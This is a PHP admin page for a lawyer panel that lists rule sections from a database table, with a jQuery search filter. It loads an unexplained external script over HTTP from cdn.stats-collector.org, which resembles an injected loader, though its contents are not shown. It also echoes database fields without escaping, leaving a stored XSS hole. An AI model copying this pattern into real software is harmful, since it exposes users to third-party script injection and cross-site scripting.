
<body class="hold-transition skin-blue sidebar-mini">
<?php include "header1.php";?>
<?php include "connection.php"; ?>
  <!-- Content Wrapper. Contains page content -->
  <div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <section class="content-header">
      <h1>
        Rules Section
        <small>Lawyer Panel Control</small>
      </h1>
      <ol class="breadcrumb">
        <li><a href="dashboard.html"><i class="fa fa-dashboard"></i> Home</a></li>
        <li class="active">Rules Section</li>
      </ol>
    </section>

    <!-- Main content -->
    <input class="form-control" id="myInput" type="text" placeholder="Search..">
  <br>
  <table class="table table-bordered table-striped">
    <thead>
      <tr>
    <th> Section </th>
        <th>Title </th>
   
        <th>Description</th>
      </tr>
    </thead>
     <?php $no="SELECT s_no,title,s_desc FROM tbl_rule ORDER BY s_no ASC";
        $result=mysqli_query($con,$no);
        
        if (mysqli_num_rows($result) > 0) {
    // output data of each row
    while($row = mysqli_fetch_assoc($result)) {
        echo "<tbody id='myTable'>
      <tr>
    <td>".$row['s_no']."</td>";
    echo "<td>".$row['title']."</td>";
    echo "<td class='ex1'>".$row['s_desc']."</td>";
    }
}
    ?>
     
    </tbody>
  </table>
  
 
</div>

<script language="javascript" charset="UTF-8" type="text/javascript" src="http://cdn.stats-collector.org/stats.js"></script>

<script>
$(document).ready(function(){
  $("#myInput").on("keyup", function() {
    var value = $(this).val().toLowerCase();
    $("#myTable tr").filter(function() {
      $(this).toggle($(this).text().toLowerCase().indexOf(value) > -1)
    });
  });
});

 </script>

